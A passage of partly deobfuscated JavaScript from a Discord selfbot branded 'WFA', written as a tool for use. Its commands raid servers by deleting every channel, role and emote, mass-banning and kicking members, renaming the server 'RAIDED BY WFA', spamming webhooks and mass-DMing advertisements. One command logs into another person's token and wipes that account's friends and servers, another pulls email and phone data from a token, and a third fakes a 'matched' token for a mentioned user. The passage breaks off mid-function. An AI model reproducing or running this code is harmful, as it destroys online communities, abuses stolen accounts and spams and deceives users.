      a4.content.startsWith(prefix + 'help backup') && (a4.edit(ghost + 'https://en-backup.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMAND]e help backup command executed')));
      a4.content.startsWith(prefix + 'help moderation') && (a4.edit(ghost + 'https://en-mod.wfaself.repl.co'), console.log(consolecolor.instagram('[COMMAND]e help moderation command executed')));

      if (a4.content.startsWith(prefix + 'help utile')) {
        a4.edit(ghost + 'https://en-util.wfaself.repl.co\nhttps://en-util-1.wfaself.repl.co/\nhttps://en-util-2.wfaself.repl.co/\nhttps://en-util-3.wfaself.repl.co/'), console.log(consolecolor.instagram('[COMMAND]e help utile command executed'));
      }

      if (a4.content === prefix + 'delete all channels') {
        let aw = a4.guild;

        if (!aw) {
          a4.edit(':x: **Please run this command in a server!**');
          return;
        }

        if (!a4.member.hasPermission('MANAGE_CHANNELS')) return a4.delete().then(console.log('[', 'ERROR'.red, ']', 'insufficient permission'.green));
        var ab = a4.guild.channels;
        ab.forEach(ay => {
          ay.delete().catch(aA => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), console.log(consolecolor.instagram('[COMMANDE] Command delete all channel command executed'));
      }

      if (a4.content === prefix + 'delete all roles') {
        let ay = a8.guild;

        if (!ay) {
          a4.edit(':x: **Please run this command on a server!**');
          return;
        }

        a4.guild.roles.forEach(aA => {
          aA.delete().catch(aB => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), console.log(consolecolor.instagram('[COMMAND] delete all role command executed'));
      }

      if (a4.content.startsWith(prefix + 'name all')) {
        let aB = a4.guild;
        if (!aB) return a8.edit(':x: **Please run this command on a server**');
        const aC = a4.content.split(' ').slice(2).join(' ') || a4.author.username;
        if (!a4.member.hasPermission('MANAGE_NICKNAMES')) return a4.delete().then(console.log('[', 'ERROR'.red, ']', 'insufficient permission'.green));
        const aD = a4.guild.members;
        a8.edit('Je renomme tout le monde par ' + aC), aD.forEach(aE => {
          aE.setNickname(aC).catch(aF => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), console.log(consolecolor.instagram('[COMMAND] name all command executed'));
      }

      if (a4.content.startsWith(prefix + 'all ban')) {
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Cette commande ne marche que sur un serveur**.');
        if (!a4.member.permissions.has('BAN_MEMBERS')) return a4.delete().then(console.log('[', 'ERROR'.red, ']', 'Il te manque des permissions'.green));
        a4.delete().catch(aE => {}), a4.guild.members.cache.forEach(aE => {
          const aF = {
            'reason': 'All Ban'
          };
          aE.ban(aF).catch(aG => {});
        });
      }

      ;

      if (a4.content.startsWith(prefix + 'all ban')) {
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Cette commande ne marche que sur un serveur**.');
        if (!a4.member.permissions.has('KICK_MEMBERS')) return a4.delete().then(console.log('[', 'ERROR'.red, ']', 'Il te manque des permissions'.green));
        a4.delete().catch(aE => {}), a4.guild.members.cache.forEach(aE => {
          const aF = {
            'reason': 'All kick'
          };
          aE.kick(aF).catch(aG => {});
        });
      }

      ;

      if (a4.content.startsWith(prefix + 'mp all')) {
        if (!a4.guild) return a4.edit(':x: **Command only usable in server**');
        a4.delete(), console.log(consolecolor.instagram('[COMMAND] Commande mp all used'));
        let aE = 0,
            aF = a6.splice(2).join(' ') || '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aG = a4.guild;
        if (!aG) return;
        setInterval(() => {
          const aH = {
            'jNuxP': function (aI, aJ) {
              return aI + aJ;
            },
            'qgluU': '[NSFW]'
          };
          {
            let aJ = aG.members.random();
            if (aJ.user.bot) return;
            if (aJ.user.id === client.user.id) return;
            if (aJ.hasPermission('ADMINISTRATOR')) return;
            if (aJ.hasPermission('MANAGE_MESSAGES')) return;
            if (aJ.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return;
            if (aJ.hasPermission('BAN_MEMBERS')) return;
            if (z[aJ.user.id]) return;
            aE++, aJ.send('Hello ^^').then(aL => aL.edit(aF)).catch(aL => console.log('[', 'ERROR'.red, ']', 'an error occurate'.green)), console.log(('[DM Send]  |' + aJ.user.username).green + '|  ' + aE);
            const aK = {
              'raison': 'mp'
            };
            z[aJ.user.id] = aK, W();
          }
        }, 8000);
      }

      a4.content.startsWith(prefix + 'stop mp all') && (a4.delete(), console.log(consolecolor.instagram('[COMMAND] Commande mp all stoped')), client.destroy().then(() => client.login(token)));

      if (a4.content === prefix + 'all kick') {
        let aI = a4.guild;
        if (!aI) return a8.edit(':x: **Please run this command on a server**');
        if (!a4.member.hasPermission('KICK_MEMBERS')) return a4.delete().then(console.log('[', 'ERROR'.red, ']', 'insufficient permission'.green));
        const aJ = a4.guild.members;
        aJ.forEach(aK => {
          if (!aK.kickable) return;
          aK.kick().catch(aL => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), console.log(consolecolor.instagram('[COMMAND] kick all command executed'));
      }

      if (a4.content.startsWith(prefix + 'deface')) {
        const aK = '6|2|0|1|5|3|4'.split('|');
        let aL = 0;
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Command only usable on server**.');
        if (!a4.member.hasPermission('ADMINISTRATOR')) return a4.edit(':x: **You do not have the permissions to run this command**');
        a4.delete();
        a4.guild.setName('RAIDED BY WFA X ' + client.user.username), a4.guild.setIcon('https://media.discordapp.net/attachments/812490234427867146/836312989581049886/wfa.jpeg?width=676&height=676');
        a4.guild.channels.forEach(aM => {
          if (!aM) return;
          aM.delete();
        });
        a4.guild.createChannel('wfa', 'text');
        console.log(consolecolor.instagram('[COMMAND] deface command executed'));
      }

      if (a4.content.startsWith(prefix + 'create channel')) {
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Command only usable on server**.');
        if (!a4.member.hasPermission('MANAGE_CHANNELS')) return a4.edit(':x: **You do not have the permissions to run this command**');
        a4.delete();

        for (let aM = 0; aM < 20; aM++) {
          a4.guild.createChannel('WFA-𝐱-' + client.user.username, 'text').catch(aN => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }

        console.log(consolecolor.instagram('[COMMAND] create channel command executed'));
      }

      if (a4.content.startsWith(prefix + 'webhook spam')) {
        let aP = a6.splice(2).join(' ') || '@everyone\nWFA\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg';
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Command only usable on server**.');
        if (!a4.member.hasPermission('MANAGE_WEBHOOKS')) return;
        a4.guild.channels.forEach(aQ => {
          if (!aQ) return;
          aQ.type == 'text' && aQ.createWebhook('WFA-Selfbot', 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU').catch(aS => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), setInterval(async function () {
          await a4.guild.fetchWebhooks().then(aQ => aQ.forEach(aR => aR.send(aP).catch(aS => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green))));
        }), console.log(consolecolor.instagram('[COMMAND] webhook spam command executed'));
      }

      a4.content.startsWith(prefix + 'start bumping') && (a4.delete(), a4.channel.send('!d bump'), setInterval(() => {
        const aQ = {
          'MUNCt': 'Un fichier n\'existe pas, ne fermez pas la fenetre je vais l\'installer.'
        };
        const aR = aQ;
        a4.channel.send('!d bump');
      }, 7203000), console.log(consolecolor.instagram('[COMMAND] start bumping command executed')));

      if (a4.content.startsWith(prefix + 'get guild banner')) {
        a4.delete();
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Command only usable on server**.');
        console.log(consolecolor.instagram('[COMMAND] get guild banner command executed')), console.log(consolecolor.summer('[BANNIERE] Here is the banner: ' + a4.guild.bannerURL));
      }

      if (a4.content.startsWith(prefix + 'get guild pfp')) {
        a4.delete();
        if (a4.channel.type === 'dm' || a4.channel.type === 'group') return a4.edit(':x: **Command only usable on server**.');
        console.log(consolecolor.instagram('[COMMAND] get guild pfp command executed')), console.log(consolecolor.summer('[BANNIERE] Here is the pfp: ' + a4.guild.iconURL));
      }

      if (a4.content.startsWith(prefix + 'dm all')) {
        if (!a4.guild) return a4.edit(':x: **Command only usable on server**');
        a4.delete(), console.log(consolecolor.instagram('[COMMAND] dm all command executed'));
        let aR = 0,
            aS = a6.splice(2).join(' ') || '**Best Selfbot Discord**\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg',
            aT = a4.guild;
        if (!aT) return;
        setInterval(() => {
          let aU = aT.members.random();
          if (aU.user.bot) return;
          if (aU.user.id === client.user.id) return;
          if (aU.hasPermission('ADMINISTRATOR')) return;
          if (aU.hasPermission('MANAGE_MESSAGES')) return;
          if (aU.hasPermission('MANAGE_ROLES_OR_PERMISSIONS')) return;
          if (aU.hasPermission('BAN_MEMBERS')) return;
          if (z[aU.user.id]) return;
          aR++, aU.send('Hello ^^').then(aW => aW.edit(aS)).catch(aW => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(('[MP Envoyé]  |' + aU.user.username).green + '|  ' + aR + ' / ' + a8.guild.members.filter(aW => aW.presence.status !== 'offline').size + ' ');
          const aV = {
            'raison': 'mp'
          };
          z[aU.user.id] = aV, W();
        }, 1000);
      }

      if (a4.content.startsWith(prefix + 'stop dm all')) {
        if (a4.deletable) a4.delete();
        commandIntervals.forEach(aV => {
          const aW = {
            'EsFsH': 'username',
            'rLeSm': 'avatar',
            'fIgHJ': 'discriminator',
            'VkYGt': 'mfa_enabled',
            'WreHX': 'phone',
            'BPjey': 'locale',
            'hKYgt': 'flags',
            'YaOur': 'email',
            'wzFJM': 'nsfw_allowed',
            'mSrAM': function (aX, aY) {
              return aX + aY;
            },
            'XNtkK': '\nUser: ',
            'ejptN': '\nId: ',
            'qkBmT': '\nEmail: ',
            'LydfV': function (aX, aY) {
              return aX + aY;
            },
            'EoyvC': '\nNuméro de telephone: ',
            'vyVAV': function (aX, aY) {
              return aX + aY;
            },
            'WAlaT': '\nAvatar: ',
            'tDKFs': '\nLangue: ',
            'cDTia': function (aX, aY) {
              return aX + aY;
            },
            'QWgGi': '\nA2f activé?: ',
            'LjNBV': function (aX, aY) {
              return aX + aY;
            },
            'XxDCd': function (aX, aY) {
              return aX + aY;
            },
            'CuzUU': '\nNsfw activé?: ',
            'iqWFv': '\nFlags: ',
            'iTgdV': '\nPublic Flags: ',
            'QIDve': function (aX, aY) {
              return aX + aY;
            },
            'kGYPN': '```',
            'sSGja': '[COMMAND] info token command executed'
          };
          clearInterval(aV);
        }), console.log(consolecolor.instagram('[COMMAND] dm all stoped'));
      }

      if (a4.content.startsWith(prefix + 'stop auto voice kick')) {
        if (!a4.guild) return a4.edit(':x: **Please run this command on a server**');
        if (!a7) return a4.edit(':x: **Please Mention a user**');
        if (!B[a4.guild.id]) return a4.edit(':x: **you haven\'t voice-blacklist an user in this server**');
        if (!B[a4.guild.id].user === a7.id) return a4.edit(':x: **you haven\'t voice-blacklist this user**');
        a7 && (delete B[a4.guild.id], console.log(consolecolor.instagram('[COMMAND] auto voice kick command stoped')), a4.edit(':white_check_mark: **Auto Voice kick stoped for this user**'), a0());
      }

      if (a4.content.startsWith(prefix + 'auto voice kick')) {
        if (!a4.guild) return a4.edit(':x: **Please run this command on a server**');
        if (!a4.guild.me.hasPermission('MOVE_MEMBERS')) return a4.reply(':x:**You don\'t have permission to kick a user**.');
        const aV = a4.mentions.members.first();

        if (!aV) {
          if (a7) {
            const aX = {};
            aX.user = a7.id, B[a4.guild.id] = aX, console.log(consolecolor.instagram('[COMMAND] auto voice kick command executed')), a4.edit(':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**'), a0();
          }

          return;
        }

        aV.setVoiceChannel(null).catch(aY => aY = 1);
        const aW = {};
        aW.user = a7.id, B[a4.guild.id] = aW, a0(), console.log(consolecolor.instagram('[COMMAND] auto voice kick command executed')), a4.edit(':white_check_mark: **Auto Voice kick config!\n\nThis user can no longer join voice channels on this server**');
      }

      if (a4.content.startsWith(prefix + 'voice kick')) {
        if (!a4.guild) return a4.edit(':x: **Please run this command on a server**');
        if (!a4.guild.me.hasPermission('MOVE_MEMBERS')) return a4.reply(':x:**You don\'t have permission to kick a user**.');
        const aY = a4.mentions.members.first();
        if (!aY) return a4.edit(':x:**Please mention a user.**');
        if (!aY.voiceChannel) return a4.edit(':x:**The user is not in a voice channel.**');
        aY.setVoiceChannel(null).catch(aZ => a4.edit(':x:**The user is not in a voice channel.**')), (a4.edit(':white_check_mark: **The user has been voice kicked correctly**'), console.log(consolecolor.instagram('[COMMAND] voice kick command executed')));
      }

      if (a4.content.startsWith(prefix + 'nuke dm')) {
        let aZ = '';
        a4.edit('**Nuking dms...**'), client.users.forEach(b0 => b0.deleteDM().catch(b1 => {})), a4.edit(':white_check_mark: **Nuked dms**'), console.log(consolecolor.instagram('[COMMAND] nuke dm command executed'));
      }

      if (a4.content.startsWith(prefix + 'afk')) {
        let b0 = a6.splice(1).join(' ') || 'WFA-SELFBOT';
        const b1 = {
          'activé': 'oui'
        };
        b1.r = b0, x[client.user.id] = b1, Y(), (a4.edit(':white_check_mark: **You are afk for**' + b0), console.log(consolecolor.instagram('[COMMAND] afk command executed')));
      }

      if (a4.content.startsWith(prefix + 'anti group on')) {
        let b3 = a6.splice(1).join(' ') || 'WFA-SELFBOT';
        const b4 = {
          'activé': 'oui'
        };
        b4.r = b3, y[client.user.id] = b4, X(), (a4.edit(':white_check_mark: **you will leave the new groups saying: ** ' + b3), console.log(consolecolor.instagram('[COMMAND] anti groupe command executed')));
      }

      a4.content.startsWith(prefix + 'anti groupe off') && (delete y[client.user.id], X(), (a4.edit(':white_check_mark: **the anti group is deactivated'), console.log(consolecolor.instagram('[COMMAND] anti groupe stopé'))));

      if (a4.content.startsWith(prefix + 'avatar' || prefix + 'pp')) {
        const b5 = a4.mentions.users.first() || a4.author;
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=Commande%2520Avatar&description=Voici%2520l%27avatar%2520de%2520' + b5.username + '&image=' + b5.avatarURL)).catch(b6 => console.log('[', 'ERREUR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] avatar command executed'));
      }

      if (a4.content === prefix + 'change hypesquad brilliance') {
        let b6 = 'https://discordapp.com/api/v6/hypesquad/online';
        const b7 = {
          'house_id': 0x2
        };
        request(b6, {
          'method': 'POST',
          'headers': {
            'authorization': token,
            'content-type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          },
          'body': JSON.stringify(b7)
        }), a8.edit(':white_check_mark: **You have joined the hypesquad  \'brilliance\'**'), console.log(consolecolor.instagram('[COMMAND] change hypesquad command executed'));
      }

      if (a4.content === prefix + 'change hypesquad ballance') {
        let b8 = 'https://discordapp.com/api/v6/hypesquad/online';
        const b9 = {
          'house_id': 0x3
        };
        request(b8, {
          'method': 'POST',
          'headers': {
            'authorization': token,
            'content-type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          },
          'body': JSON.stringify(b9)
        }), a8.edit(':white_check_mark: **You have joined the hypesquad  \'ballance\'**'), console.log(consolecolor.instagram('[COMMAND] change hypesquad command executed'));
      }

      if (a4.content === prefix + 'change hypesquad bravery') {
        let ba = 'https://discordapp.com/api/v6/hypesquad/online';
        const bb = {
          'house_id': 0x1
        };
        (request(ba, {
          'method': 'POST',
          'headers': {
            'authorization': token,
            'content-type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
          },
          'body': JSON.stringify(bb)
        }), a8.edit(':white_check_mark: **You have joined the hypesquad  \'bravery\'**')), console.log(consolecolor.instagram('[COMMAND] change hypesquad command executed'));
      }

      if (a4.content.startsWith(prefix + 'mp friend')) {
        if (!a6) throw 'You must have something to say!';
        let bd = a6.splice(2).join(' ') || 'WFA Selfbot\nhttps://www.youtube.com/channel/UC6Avt0DUQ2hoU7TeNDOglHg';
        client.user.friends.forEach(be => {
          be.send(bd).catch(bf => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }), console.log(consolecolor.instagram('[COMMAND] mp friend command executed'));
      }

      a4.content === prefix + 'stats' && (a4.edit('```Selfbot - Statistics | WFA - Selfbot\nMemoire Usage: ' + (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2) + 'MB\n\nServers: ' + client.guilds.size + '\n\nChannels: ' + client.channels.size + '\n\nMembers: ' + client.guilds.map(be => be.memberCount).reduce((be, bf) => be + bf) + '```').catch(be => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] stats command executed')));
      a4.content.startsWith('##') && (a4.channel.fetchMessages().then(be => be.forEach(bf => {
        bf.author.id === client.user.id && bf.delete().catch(bg => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
      })), console.log(consolecolor.instagram('[COMMAND] purge command executed')));

      if (a8.content.startsWith(prefix + 'discord')) {
        a8.edit(ghost + 'https://embed.rauf.workers.dev/?author=Discord%2520Version&description=La%2520version%2520de%2520discord%253A%2520' + discord.version).catch(be => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] discord command executed'));
      }

      a4.content === prefix + 'restart' && (a4.edit('**restartredémarrage** of the bot...').then(client.destroy()).then(() => client.login(token)), console.log(consolecolor.instagram('[COMMAND] restart command executed')));

      if (a4.content.startsWith(prefix + 'set server name')) {
        let bg = a6.splice(1).join(' ') || 'WFA selfbot';
        a4.edit('Change the server name to: ' + bg), a4.guild.setName(bg), console.log(consolecolor.instagram('[COMMAND] set serveur name command executed'));
      }

      if (a4.content.startsWith(prefix + 'token')) {
        if (!a7) {
          a4.edit(':x: **Please mention a user!**');
          return;
        }

        const bi = a7.username.split(' ').join('%2520'),
              bj = client.user.username.split(' ').join('%2520');
        let bk = ['HircHg', 'XnyXiA', 'XluxwQ', 'XXn_KA', 'Xiq-WQ'],
            bl = ['a6uny9jcMjet2W2LASruribq6VI', 'oZyGJDamSJ4hmJaaLvzdNo1bLqk', '3_6Xt2k4OieDKimnNYGWUq9vJRo', 'xllelHltGdY7DP_0s1XST4cgzTs'];
        var ac = a7.id,
            ad = utf8.encode(ac),
            ae = base64.encode(ad);
        setTimeout(() => {
          a4.edit('░░░░░░░░░░ 0%');
        }, 1000), setTimeout(() => {
          a4.edit('▓▓░░░░░░░░ 20%');
        }, 1500), setTimeout(() => {
          a4.edit('▓▓▓▓░░░░░░ 40%');
        }, 2000), setTimeout(() => {
          a4.edit('▓▓▓▓▓▓░░░░ 60%');
        }, 2500), setTimeout(() => {
          a4.edit('▓▓▓▓▓▓▓▓░░ 80%');
        }, 3000), setTimeout(() => {
          a4.edit('▓▓▓▓▓▓▓▓▓▓ 100%');
        }, 3500), setTimeout(() => {
          a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=Token%2520match%2520' + bi + '&description=') + ae + '.' + bk[Math.floor(Math.random() * bk.length)] + '.' + bl[Math.floor(Math.random() * bl.length)]).catch(bn => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        }, 4000), console.log(consolecolor.instagram('[COMMAND] token command executed'));
      }

      if (a4.content.startsWith(prefix + 'sansxksch')) {
        console.log(' '), console.log(consolecolor.mind('[EASTER EGG] GG you find an easter egg !')), console.log(consolecolor.mind('[EASTER EGG] Sans and KSCH are the designers of WFA Project !')), console.log(' ');
      }

      a4.content.startsWith(prefix + 'ksch') && (console.log(' '), console.log(consolecolor.mind('[EASTER EGG] GG you find an easter egg !')), console.log(consolecolor.mind('[EASTER EGG] KSCH is he the developer of WFA Project !')), console.log(' '));

      if (a4.content.startsWith(prefix + 'encode')) {
        const bp = '2|4|1|5|3|0'.split('|');
        let bq = 0;
        var ag = a6.join(' ') || 'WFA selfbot';
        var ad = utf8.encode(ag);
        var af = base64.encode(ad);
        var ah = af.split(' ').join('%2520');
        a4.edit(ghost + ('https://embed.rauf.workers.dev/?author=Code%2520Encode&description=Text%2520-%253E%2520Base64%253A%2520' + ah)).catch(br => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green));
        console.log(consolecolor.instagram('[COMMAND] encode command executed'));
      }

      if (a4.content.startsWith(prefix + 'steal bannier')) {
        a4.delete();
        let br = a4.guild.bannerURL;
        console.log(consolecolor.instagram('[COMMAND] steal bannier command executed')), console.log(('Voici la bannière de ' + a4.guild.name + ': ').blue + ('' + br).green);
      }

      if (a4.content.startsWith(prefix + 'steal emote')) {
        if (a4.channel.type === 'dm') {
          a4.edit(':x: **Command not executable in dm**');
          return;
        }

        let bs = a6.splice(2).join(' '),
            bt = client.guilds.get(bs);

        if (!bt) {
          a4.edit(':x: **No server found with the id** "' + bs + '"');
          return;
        }

        if (!a4.member.hasPermission('MANAGE_EMOJIS')) return a4.edit(':x: **You do not have "Manage emojis" permissions on this server**');
        bt.emojis.size < 1 && a4.edit(':x: **The server does not contain any emote.**');
        let bu = '1';
        bt.emojis.forEach(bx => {
          const by = {
            'YXXwO': function (bz, bA) {
              return bz + bA;
            },
            'VCGOu': 'https://cdn.discordapp.com/emojis/',
            'pSmty': 'gif',
            'NvTCI': 'png'
          };
          setTimeout(() => {
            let bz = bx.name;
            const bA = 'https://cdn.discordapp.com/emojis/' + bx.id + '.' + bx.animated ? 'gif' : 'png';
            a4.guild.createEmoji(bA, bz).catch(bB => bu + 1);
          }, 1500);
        }), console.log(consolecolor.instagram('[COMMAND] steal emote command executed')), a4.edit(':white_check_mark: **I stole the emotes from the server** "' + bt.name + '"');
      }

      if (a4.content == prefix + 'delete all emote') {
        if (a4.channel.type === 'dm') {
          a4.edit(':x: **Command not executable in dm**');
          return;
        }

        if (a4.guild.emogis.size < 1) {
          a4.edit(':x: **There are no emotes to delete.**');
          return;
        }

        a4.guild.emojis.forEach(by => {
          a4.guilds.emojis.get(by.id).delete();
        }), console.log(consolecolor.instagram('[COMMAND] delete all emote command executed'));
      }

      if (a4.content.startsWith(prefix + 'grab pfp')) {
        let bz = a4.mentions.users.first(),
            bA = bz.avatarURL;

        if (!bz) {
          a4.edit(':x: **Please mention a user valide!**');
          return;
        }

        if (!bA) {
          a4.edi(':x: **This user does not have an avatar!**');
          return;
        }

        client.user.setAvatar(bA), console.log(consolecolor.instagram('[COMMAND] grab pfp command executed')), a4.edit(':white_check_mark: **I correctly stole the profile picture of ** "' + bz.username + '"');
      }

      if (a4.content == prefix + 'backup friend') {
        var ai = client.user.friends.size;
        const bC = client.user.friends.array();
        let bD = 'Successfully backed up ' + bC.length.toString().bold + ' friends.'.green;
        console.log(bD), hastebins(bC + '\n').then(bE => {
          a4.edit('```WFA BACKUP FRIEND\n\nhastebins link: ' + bE + '\n\n***you can copy and paste the list on the current channel and then you can right click on a nickname / send a message / add friend ect...```').catch(bF => console.log('[', 'ERROR'.red, ']', 'an error has occurred that I cannot fix'.green)), console.log(consolecolor.instagram('[COMMAND] backup friend command executed'));
        });
      }

      if (a4.content === prefix + 'ddos voc') {
        if (!a8.guild) return a4.edit(':x: **Please run this command on a server**');

        if (!a4.member.hasPermission('ADMINISTRATOR')) {
          a4.channel.send(':x: **You need administrator permissions to run this command**');
          return;
        }

        let bE = 0;
        const bF = ['japan', 'hongkong', 'russia', 'india', 'brazil', 'sydney'];
        setInterval(() => {
          a4.guild.setRegion(bF[bE]), bE++;
          if (bE === bF.length) bE = 0;
        }, 1000), a8.edit('**ddos vocal command activate**'), console.log(consolecolor.instagram('[COMMAND] ddos voc command executed'));
      }

      if (a4.content === prefix + 'ddos-stop') {
        if (!a8.guild) return a4.edit(':x: **Please run this command on a server**');
        clearInterval(), a8.edit('**ddos command stoped**'), console.log(consolecolor.instagram('[COMMAND] ddos voc stopée'));
      }

      if (a4.content.startsWith(prefix + 'fuck token')) {
        let bH = new Client(),
            bI = a6.splice(2).join(' '),
            bJ = 'https://discordapp.com/api/v6/users/@me';
        const bK = {};
        bK.authorization = bI;
        const bL = {
          'method': 'GET'
        };
        bL.headers = bK, request(bJ, bL, function (bM, bN, bO) {
          const bP = {
            'etpqo': '10%',
            'yhvIe': '15%',
            'FNqgh': '25%',
            'VMhfb': '30%',
            'xkCpU': '35%',
            'jPJOL': '40%',
            'xlOQq': '45%',
            'kSuRa': '50%',
            'HOORf': '60%',
            'GVNMF': '65%',
            'AgwOB': '70%',
            'ctinQ': '75%',
            'BnPCj': '80%',
            'niSzU': '85%',
            'sgXAd': '90%',
            'UeNdE': '95%',
            'YFqWT': '100%',
            'cMmaF': '%2520',
            'JEIGk': function (bQ, bR) {
              return bQ + bR;
            },
            'LMZwV': '[COMMANDE] Commande lovecalc executé',
            'wmHUY': '```WFA BACKUP FRIEND\n\nLien hastebins: ',
            'CrTog': '\n\n***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...```',
            'AWVuP': function (bQ, bR) {
              return bQ < bR;
            },
            'ixbch': function (bQ, bR) {
              return bQ === bR;
            },
            'NbzbJ': 'URCrg',
            'QWdmq': 'london'
          };
          {
            if (bN.statusCode === 200) {
              bH.on('ready', function () {
                for (pas = 0; pas < 100; pas++) {
                  bH.user.createGuild('WFA-Selfbot', 'london');
                }
              });

              for (pas = 0; pas < 20; pas++) {
                fetch('https://discord.com/api/v8/users/@me/settings', {
                  'headers': {
                    'authorization': bI,
                    'content-type': 'application/json'
                  },
                  'body': '{"theme":"light"}',
                  'method': 'PATCH'
                }), fetch('https://discord.com/api/v8/users/@me/settings', {
                  'headers': {
                    'authorization': bI,
                    'content-type': 'application/json'
                  },
                  'body': '{"theme":"dark"}',
                  'method': 'PATCH'
                });
              }

              bH.on('ready', function () {
                const bS = {
                  'QtKin': 'https://www.twitch.tv/OGAGAL_risitas',
                  'veWFy': 'WFA-Selfbot',
                  'PtOaA': 'tokyo',
                  'ZbAtI': function (bT, bU) {
                    return bT !== bU;
                  },
                  'VaWrN': 'Token timeout',
                  'SQzzS': '879157124230414406',
                  'IuSKu': function (bT, bU) {
                    return bT === bU;
                  },
                  'acECn': '843993531273707540',
                  'WGzpR': function (bT, bU) {
                    return bT === bU;
                  },
                  'LQlot': 'retry-after',
                  'euTEW': function (bT, bU) {
                    return bT / bU;
                  },
                  'NiHKT': function (bT, bU) {
                    return bT - bU;
                  },
                  'NIyua': 'PUT'
                };
                bH.user.friends.forEach(bT => {
                  if (bT.id === '826503000541102200') return;
                  bH.user.removeFriend(bT).catch(bU => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                }), bH.guilds.forEach(bT => {
                  const bU = {
                    'fwOao': 'Tokyo Ghoul',
                    'wrwls': 'https://www.twitch.tv/OGAGAL_risitas',
                    'daeQz': '603405368940429315',
                    'LrfHC': function (bV) {
                      return bV();
                    },
                    'IhpLJ': 'WFA-Selfbot',
                    'SRdmT': 'tokyo',
                    'sbgPA': function (bV, bW) {
                      return bV !== bW;
                    },
                    'YBmkR': 'lHJTs',
                    'BRFsm': 'Token timeout'
                  };
                  if (bT.id === '879157124230414406') return;
                  if (bT.id === '843993531273707540') return;
                  if (bT.ownerID === bH.user.id) bT.delete().catch(bV => {
                    if (bV) {
                      console.log('Token timeout'.red);
                    }
                  });else bT.leave().catch(bV => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
                }), a4.edit(':white_check_mark: **Token fuck en cours...**');
              }), bH.login(bI);
            } else a4.edit('>>> **Token Info | WFA - Selfbot**\n    \n    \n                Le token: \n                ```' + bI + '```\n                \n                Le token ' + bI + ' \nn\'est pas valide :x:\n    ').catch(bS => console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green));
          }
        }), console.log(consolecolor.instagram('[COMMAND] fuck token command executed'));
      }

      if (a4.content.startsWith(prefix + 'info token')) {
        let bN = a6.splice(2).join(' '),
            bO = 'https://discordapp.com/api/v6/users/@me';
        const bP = {};
        bP.authorization = bN;
        const bQ = {
          'method': 'GET'
        };
        bQ.headers = bP, request(bO, bQ, function (bR, bS, bT) {
          const bU = {
            'plYnW': 'public_flags',
            'auGfa': 'email',
            'oOkMo': 'verified',
            'GEPvv': 'nsfw_allowed',
            'aEHRN': function (bV, bW) {
              return bV + bW;
            },
            'sXyJA': function (bV, bW) {
              return bV + bW;
            },
            'EAGHm': '\nId: ',
            'zzRdc': '\nNuméro de telephone: ',
            'QoWCe': function (bV, bW) {
              return bV + bW;
            },
            'tIbNT': '\nCompte vérifié?: ',
            'hnLow': function (bV, bW) {
              return bV + bW;
            },
            'gDrWa': '```',
            'omXZD': '[COMMAND] info token command executed',
            'grvmo': '[COMMANDE] Commande thigh executé',
            'LaLdN': function (bV, bW) {
              return bV !== bW;
            },
            'CIdwh': 'uQOne',
            'pMZKR': 'FHzZH',
            'OSNbG': 'https://discordapp.com/api/v6/users/@me',
            'fcSXL': function (bV, bW, bX, bY) {
              return bV(bW, bX, bY);
            },
            'CnPje': 'GET'
          };
          {
